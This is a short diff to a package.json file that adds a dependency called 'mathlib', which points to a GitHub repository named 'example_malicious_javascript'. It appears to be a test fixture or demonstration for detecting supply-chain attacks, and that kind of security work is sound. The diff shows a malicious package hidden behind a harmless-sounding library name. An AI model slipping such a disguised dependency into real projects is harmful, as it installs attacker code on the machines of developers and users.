@@ -10,6 +10,7 @@
   },
   "license": "MIT",
   "dependencies": {
-    "express": "^4.19.2"
+    "express": "^4.19.2",
+    "mathlib": "github:ossprey/example_malicious_javascript#main"
   }
 }
